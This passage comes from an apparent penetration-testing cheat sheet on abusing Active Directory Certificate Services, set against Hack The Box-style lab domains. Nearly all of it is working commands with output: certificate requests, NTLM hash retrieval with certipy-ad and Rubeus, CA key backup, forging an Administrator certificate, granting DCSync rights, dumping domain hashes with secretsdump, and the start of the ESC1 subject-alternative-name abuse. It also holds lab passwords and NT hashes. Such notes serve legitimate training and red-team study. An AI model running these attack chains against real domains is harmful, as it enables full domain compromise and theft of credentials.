        Enrollment Rights           : sequel\Domain Admins               S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users                S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins           S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator               S-1-5-21-4078382237-1492182817-2568127209-500
        Write Owner                 : sequel\Administrator               S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins               S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins           S-1-5-21-4078382237-1492182817-2568127209-519
        Write Dacl                  : sequel\Administrator               S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins               S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins           S-1-5-21-4078382237-1492182817-2568127209-519
        Write Property              : sequel\Administrator               S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins               S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins           S-1-5-21-4078382237-1492182817-2568127209-519

Certify completed in 00:00:15.8331578
```

{{< /tabcontent >}}
{{< tabcontent set1-2 tab2 >}}

```console
# Check env
certutil
```

```console {class="sample-code"}
evil-winrm-py PS C:\Users\Administrator\Documents> certutil
Entry 0: (Local)
  Name:                         "sequel-DC-CA"
  Organizational Unit:          ""
  Organization:                 ""
  Locality:                     ""
  State:                        ""
  Country/region:               ""
  Config:                       "dc.sequel.htb\sequel-DC-CA"
  Exchange Certificate:         ""
  Signature Certificate:        "dc.sequel.htb_sequel-DC-CA.crt"
  Description:                  ""
  Server:                       "dc.sequel.htb"
  Authority:                    "sequel-DC-CA"
  Sanitized Name:               "sequel-DC-CA"
  Short Name:                   "sequel-DC-CA"
  Sanitized Short Name:         "sequel-DC-CA"
  Flags:                        "13"
  Web Enrollment Servers:       ""
CertUtil: -dump command completed successfully.
```

```console
# List cert templates
certutil -catemplates
```

```console {class="sample-code"}
evil-winrm-py PS C:\Users\Administrator\Documents> certutil -catemplates
UserAuthentication: UserAuthentication -- Auto-Enroll: Access is denied.
DirectoryEmailReplication: Directory Email Replication -- Auto-Enroll: Access is denied.
DomainControllerAuthentication: Domain Controller Authentication -- Auto-Enroll: Access is denied.
KerberosAuthentication: Kerberos Authentication -- Auto-Enroll: Access is denied.
EFSRecovery: EFS Recovery Agent -- Auto-Enroll: Access is denied.
EFS: Basic EFS -- Auto-Enroll: Access is denied.
DomainController: Domain Controller -- Auto-Enroll: Access is denied.
WebServer: Web Server -- Auto-Enroll: Access is denied.
Machine: Computer -- Auto-Enroll: Access is denied.
User: User -- Auto-Enroll: Access is denied.
SubCA: Subordinate Certification Authority -- Auto-Enroll: Access is denied.
Administrator: Administrator -- Auto-Enroll: Access is denied.
CertUtil: -CATemplates command completed successfully.
```

{{< /tabcontent >}}
{{< /tabcontent >}}

---

### Request a Personal Information Exchange File (.pfx)

{{< tab set3 tab1 >}}Linux{{< /tab >}}
{{< tab set3 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 1. Request a Certificate

```console {class="password"}
# Password
certipy-ad req -u '<USER>' -p '<PASSWORD>' -ca <CA> -template User -target <DC> -ns <DC_IP> -pfx '<USER>.pfx'
```

```console {class="sample-code"}
$ certipy-ad req -u 'ryan.cooper' -p 'NuclearMosquito3' -ca sequel-DC-CA -template User -target dc.sequel.htb -ns 10.129.33.22 -pfx 'ryan.cooper.pfx'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with UPN 'Ryan.Cooper@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'ryan.cooper.pfx'
[*] Wrote certificate and private key to 'ryan.cooper.pfx'
```

```console {class="ntlm"}
# NTLM
certipy-ad req -u '<USER>' -hashes <HASH> -ca <CA> -template User -target <DC> -ns <DC_IP> -pfx '<USER>.pfx'
```

```console {class="sample-code"}
$ certipy-ad req -u 'ryan.cooper' -hashes 98981eed8e9ce0763bb3c5b3c7ed5945 -ca sequel-DC-CA -template User -target dc.sequel.htb -ns 10.129.33.22 -pfx 'ryan.cooper.pfx'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 19
[*] Successfully requested certificate
[*] Got certificate with UPN 'Ryan.Cooper@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'ryan.cooper.pfx'
[*] Wrote certificate and private key to 'ryan.cooper.pfx'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -ca <CA> -template User -target <DC> -dc-host <DC> -ns <DC_IP> -pfx '<USER>.pfx'
```

```console {class="sample-code"}
$ certipy-ad req -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -k -ca sequel-DC-CA -template User -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -pfx 'ryan.cooper.pfx'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with UPN 'Ryan.Cooper@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'ryan.cooper.pfx'
[*] Wrote certificate and private key to 'ryan.cooper.pfx'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -hashes <HASH> -k -ca <CA> -template User -target <DC> -dc-host <DC> -ns <DC_IP> -pfx '<USER>.pfx'
```

```console {class="sample-code"}
$ certipy-ad req -u 'ryan.cooper@sequel.htb' -hashes 98981eed8e9ce0763bb3c5b3c7ed5945 -k -ca sequel-DC-CA -template User -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -pfx 'ryan.cooper.pfx'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Requesting certificate via RPC
[*] Request ID is 20
[*] Successfully requested certificate
[*] Got certificate with UPN 'Ryan.Cooper@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'ryan.cooper.pfx'
[*] Wrote certificate and private key to 'ryan.cooper.pfx'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -k -ca <CA> -template User -target <DC> -dc-host <DC> -ns <DC_IP> -pfx '<USER>.pfx'
```

```console {class="sample-code"}
$ certipy-ad req -u 'ryan.cooper@sequel.htb' -k -ca sequel-DC-CA -template User -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -pfx 'ryan.cooper.pfx'                                
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'Ryan.Cooper@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'ryan.cooper.pfx'
[*] Wrote certificate and private key to 'ryan.cooper.pfx'
```

#### 2. Get NTLM Hash

```console
sudo ntpdate -s <DC_IP> && certipy-ad auth -pfx '<USER>.pfx' -domain <DOMAIN> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.33.22 && certipy-ad auth -pfx 'ryan.cooper.pfx' -domain sequel.htb -dc-ip 10.129.33.22
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Ryan.Cooper@sequel.htb'
[*] Using principal: 'ryan.cooper@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.cooper.ccache'
[*] Wrote credential cache to 'ryan.cooper.ccache'
[*] Trying to retrieve NT hash for 'ryan.cooper'
[*] Got hash for 'ryan.cooper@sequel.htb': aad3b435b51404eeaad3b435b51404ee:98981eed8e9ce0763bb3c5b3c7ed5945
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

#### 1. Request a Certificate

```console
.\Certify.exe request --ca <SERVER>\<CA> --template User
```

```console {class="sample-code"}
evil-winrm-py PS C:\programdata> .\Certify.exe request --ca dc01.haze.htb\haze-DC01-CA --template User

   _____          _   _  __          
  / ____|        | | (_)/ _|         
 | |     ___ _ __| |_ _| |_ _   _    
 | |    / _ \ '__| __| |  _| | | |   
 | |___|  __/ |  | |_| | | | |_| |   
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |   
                            |___./   
  v2.0.0                         

[*] Action: Request a certificate

[*] Current user context    : HAZE\Administrator
[*] No subject name specified, using current context as subject.

[*] Template                : User
[*] Subject                 : CN=Administrator, CN=Users, DC=haze, DC=htb

[*] Certificate Authority   : dc01.haze.htb\haze-DC01-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 3

[*] Certificate (PFX)       :

MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqhkiG9w---[SNIP]---0AaQBuAGkAcwB0AHIAYQB0AG8AcgAAAAAAAAAAAAAAAAAAAAA=

Certify completed in 00:00:12.4915168
```

#### 2. Get NTLM Hash

```console
.\rubeus.exe asktgt /user:'<USER>' /certificate:<BASE64_PFX> /getcredentials /show /nowrap
```

```console {class="sample-code"}
evil-winrm-py PS C:\programdata> .\rubeus.exe asktgt /user:'Administrator' /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqhkiG9w---[SNIP]---0AaQBuAGkAcwB0AHIAYQB0AG8AcgAAAAAAAAAAAAAAAAAAAAA= /getcredentials /show /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Ask TGT

[*] Got domain: haze.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Administrator, CN=Users, DC=haze, DC=htb 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'haze.htb\Administrator'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGNDCCBjCgAwIBBaEDAgEWooIFUDCCBUxhggVIMIIFRKADAg---[SNIP]---pFLkhUQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIaGF6ZS5odGI=

  ServiceName              :  krbtgt/haze.htb
  ServiceRealm             :  HAZE.HTB
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  HAZE.HTB
  StartTime                :  10/31/2025 5:41:29 PM
  EndTime                  :  11/1/2025 3:41:29 AM
  RenewTill                :  11/7/2025 4:41:29 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  mg++FvMp7vpSnf+7apBBsg==
  ASREP (key)              :  DF6B9986187FCB17B421C67BE7923396

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 06DC954D32CB91AC2831D67E3E12027F
```

{{< /tabcontent >}}

---

### Administrator of CA Host

{{< tab set4 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set4 tab1 >}}

#### 1. Backup CA Certificate and Private Key

```console {class="password"}
# Password
certipy-ad ca -u '<USER>' -p '<PASSWORD>' -target <TARGET> -ns <DC_IP> -backup
```

```console {class="sample-code"}
$ certipy-ad ca -u 'admin' -p 'Password123!' -target dc.sequel.htb -ns 10.129.33.22 -backup
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Creating new service for backup operation
[*] Creating backup
[*] Retrieving backup
[*] Got certificate and private key
[*] Backing up original PFX/P12 to 'pfx.p12'
[*] Backed up original PFX/P12 to 'pfx.p12'
[*] Saving certificate and private key to 'sequel-DC-CA.pfx'
[*] Wrote certificate and private key to 'sequel-DC-CA.pfx'
[*] Cleaning up
```

```console {class="ntlm"}
# NTLM
certipy-ad ca -u '<USER>' -hashes <HASH> -target <DC> -ns <DC_IP> -backup
```

```console {class="sample-code"}
$ certipy-ad ca -u 'admin@sequel.htb' -p 'Password123!' -k -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -backup
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Creating new service for backup operation
[*] Creating backup
[*] Retrieving backup
[*] Got certificate and private key
[*] Backing up original PFX/P12 to 'pfx.p12'
[*] Backed up original PFX/P12 to 'pfx.p12'
[*] Saving certificate and private key to 'sequel-DC-CA.pfx'
[*] Wrote certificate and private key to 'sequel-DC-CA.pfx'
[*] Cleaning up
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad ca -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <DC> -dc-host <DC> -ns <DC_IP> -backup
```

```console {class="sample-code"}
$ certipy-ad ca -u 'admin@sequel.htb' -p 'Password123!' -k -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -backup
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Creating new service for backup operation
[*] Creating backup
[*] Retrieving backup
[*] Got certificate and private key
[*] Backing up original PFX/P12 to 'pfx.p12'
[*] Backed up original PFX/P12 to 'pfx.p12'
[*] Saving certificate and private key to 'sequel-DC-CA.pfx'
[*] Wrote certificate and private key to 'sequel-DC-CA.pfx'
[*] Cleaning up
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad ca -u '<USER>@<DOMAIN>' -hashes <HASH> -k -target <DC> -dc-host <DC> -ns <DC_IP> -backup
```

```console {class="sample-code"}
$ certipy-ad ca -u 'admin@sequel.htb' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -k -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -backup
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Creating new service for backup operation
[*] Creating backup
[*] Retrieving backup
[*] Got certificate and private key
[*] Backing up original PFX/P12 to 'pfx.p12'
[*] Backed up original PFX/P12 to 'pfx.p12'
[*] Saving certificate and private key to 'sequel-DC-CA.pfx'
[*] Wrote certificate and private key to 'sequel-DC-CA.pfx'
[*] Cleaning up
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad ca -u '<USER>@<DOMAIN>' -k -target <DC> -dc-host <DC> -ns <DC_IP> -backup
```

```console {class="sample-code"}
$ certipy-ad ca -u 'admin@sequel.htb' -k -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -backup
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Creating new service for backup operation
[*] Creating backup
[*] Retrieving backup
[*] Got certificate and private key
[*] Backing up original PFX/P12 to 'pfx.p12'
[*] Backed up original PFX/P12 to 'pfx.p12'
[*] Saving certificate and private key to 'sequel-DC-CA.pfx'
[*] Wrote certificate and private key to 'sequel-DC-CA.pfx'
[*] Cleaning up
```

#### 2. Forge a Certificate

```console
certipy-ad forge -ca-pfx <CA>.pfx -upn administrator@<DOMAIN> -subject 'CN=Administrator,CN=Users,DC=<EXAMPLE>,DC=<COM>'
```

```console {class="sample-code"}
$ certipy-ad forge -ca-pfx sequel-DC-CA.pfx -upn administrator@sequel.htb -subject 'CN=Administrator,CN=Users,DC=sequel,DC=htb'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'administrator_forged.pfx'
[*] Wrote forged certificate and private key to 'administrator_forged.pfx'
```

#### 3. Export '.crt' and '.key' from '.pfx'

```console
# Export crt
certipy-ad cert -pfx 'administrator_forged.pfx' -nokey -out 'administrator_forged.crt'
```

```console {class="sample-code"}
$ certipy-ad cert -pfx 'administrator_forged.pfx' -nokey -out 'administrator_forged.crt'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Data written to 'administrator_forged.crt'
[*] Writing certificate to 'administrator_forged.crt'
```

```console
# Export key
certipy-ad cert -pfx 'administrator_forged.pfx' -nocert -out 'administrator_forged.key'
```

```console {class="sample-code"}
$ certipy-ad cert -pfx 'administrator_forged.pfx' -nocert -out 'administrator_forged.key'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Data written to 'administrator_forged.key'
[*] Writing private key to 'administrator_forged.key'
```

#### 4. Grant Target User DCSync Right

```console
python3 passthecert.py -action modify_user -crt administrator_forged.crt -key administrator_forged.key -target <TARGET_USER> -elevate -domain <DOMAIN> -dc-host <DC>
```

```console {class="sample-code"}
$ python3 ~/Desktop/Tools/Windows/PassTheCert/Python/passthecert.py -action modify_user -crt administrator_forged.crt -key administrator_forged.key -target ryan.cooper -elevate -domain sequel.htb -dc-host dc.sequel.htb 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Granted user 'ryan.cooper' DCSYNC rights!
```

#### 5. Secrets Dump

```console {class="password"}
# Password
impacket-secretsdump '<DOMAIN>/<TARGET_USER>:<PASSWORD>@<TARGET>'
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper:NuclearMosquito3@dc.sequel.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

```console {class="ntlm"}
# NTLM
impacket-secretsdump '<DOMAIN>/<TARGET_USER>@<TARGET>' -hashes :<HASH>
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -hashes :98981eed8e9ce0763bb3c5b3c7ed5945
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
impacket-secretsdump '<DOMAIN>/<TARGET_USER>:<PASSWORD>@<TARGET>' -k
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper:NuclearMosquito3@dc.sequel.htb' -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] CCache file is not found. Skipping...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
impacket-secretsdump '<DOMAIN>/<TARGET_USER>@<TARGET>' -hashes :<HASH> -k
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -hashes :98981eed8e9ce0763bb3c5b3c7ed5945 -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] CCache file is not found. Skipping...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
impacket-secretsdump '<DOMAIN>/<TARGET_USER>@<TARGET>' -k -no-pass
```

```console {class="sample-code"}
$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
---[SNIP]---
```

{{< /tabcontent >}}

---

### ESC1: Enrollee-Supplied Subject for Client Authentication

#### Set Subject Alternative Name (SAN)

{{< tab set5 tab1 >}}Linux{{< /tab >}}
{{< tab set5 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set5 tab1 >}}

#### 1. Lookup SID

```console {class="password"}
# Password
certipy-ad account -u '<USER>' -p '<PASSWORD>' -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' read
```

```console {class="sample-code"}
$ certipy-ad account -u 'ryan.cooper' -p 'NuclearMosquito3' -target 'dc.sequel.htb' -dc-ip '10.129.33.22' -user 'administrator' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=sequel,DC=htb
    name                                : Administrator
    objectSid                           : S-1-5-21-4078382237-1492182817-2568127209-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 1114624
    whenCreated                         : 2022-11-18T17:11:51+00:00
    whenChanged                         : 2025-10-29T11:25:07+00:00
```

```console {class="ntlm"}
# NTLM
certipy-ad account -u '<USER>' -hashes '<HASH>' -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' read
```

```console {class="sample-code"}
$ certipy-ad account -u 'ryan.cooper' -hashes '98981eed8e9ce0763bb3c5b3c7ed5945' -target 'dc.sequel.htb' -dc-ip '10.129.33.22' -user 'administrator' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=sequel,DC=htb
    name                                : Administrator
    objectSid                           : S-1-5-21-4078382237-1492182817-2568127209-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 1114624
    whenCreated                         : 2022-11-18T17:11:51+00:00
    whenChanged                         : 2025-10-29T11:25:07+00:00
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad account -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target '<DC>' -dc-host <DC> -dc-ip <DC_IP> -user '<TARGET_USER>' read
```

```console {class="sample-code"}
$ certipy-ad account -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -k -target 'dc.sequel.htb' -dc-ip '10.129.33.22' -dc-host dc.sequel.htb -ns 10.129.33.22 -user 'administrator' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=sequel,DC=htb
    name                                : Administrator
    objectSid                           : S-1-5-21-4078382237-1492182817-2568127209-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 1114624
    whenCreated                         : 2022-11-18T17:11:51+00:00
    whenChanged                         : 2025-10-29T11:25:07+00:00
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad account -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target '<DC>' -dc-host <DC> -dc-ip <DC_IP> -user '<TARGET_USER>' read
```

```console {class="sample-code"}
$ certipy-ad account -u 'ryan.cooper@sequel.htb' -hashes '98981eed8e9ce0763bb3c5b3c7ed5945' -k -target 'dc.sequel.htb' -dc-ip '10.129.33.22' -dc-host dc.sequel.htb -ns 10.129.33.22 -user 'administrator' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=sequel,DC=htb
    name                                : Administrator
    objectSid                           : S-1-5-21-4078382237-1492182817-2568127209-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 1114624
    whenCreated                         : 2022-11-18T17:11:51+00:00
    whenChanged                         : 2025-10-29T11:25:07+00:00
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad account -u '<USER>@<DOMAIN>' -k -target '<DC>' -dc-host <DC> -dc-ip <DC_IP> -user '<TARGET_USER>' read
```

```console {class="sample-code"}
$ certipy-ad account -u 'ryan.cooper@sequel.htb' -k -target 'dc.sequel.htb' -dc-ip '10.129.33.22' -dc-host dc.sequel.htb -ns 10.129.33.22 -user 'administrator' read
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=sequel,DC=htb
    name                                : Administrator
    objectSid                           : S-1-5-21-4078382237-1492182817-2568127209-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 1114624
    whenCreated                         : 2022-11-18T17:11:51+00:00
    whenChanged                         : 2025-10-29T11:25:07+00:00
```

#### 2. Request Certificate for the Target User

```console {class="password"}
# Password
certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
```

```console {class="sample-code"}
$ certipy-ad req -u 'ryan.cooper' -p 'NuclearMosquito3' -target dc.sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication -key-size 4096 -sid S-1-5-21-4078382237-1492182817-2568127209-500
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc.sequel.htb.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="ntlm"}
# NTLM
certipy-ad req -u '<USER>' -hashes '<HASH>' -target <TARGET> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
```

```console {class="sample-code"}
$ certipy-ad req -u 'ryan.cooper' -hashes '98981eed8e9ce0763bb3c5b3c7ed5945' -target dc.sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication -key-size 4096 -sid S-1-5-21-4078382237-1492182817-2568127209-500
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc.sequel.htb.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 23
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-host <DC> -ns <DC_IP> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
```

```console {class="sample-code"}
$ certipy-ad req -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -k -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication -key-size 4096 -sid S-1-5-21-4078382237-1492182817-2568127209-500
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 24
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
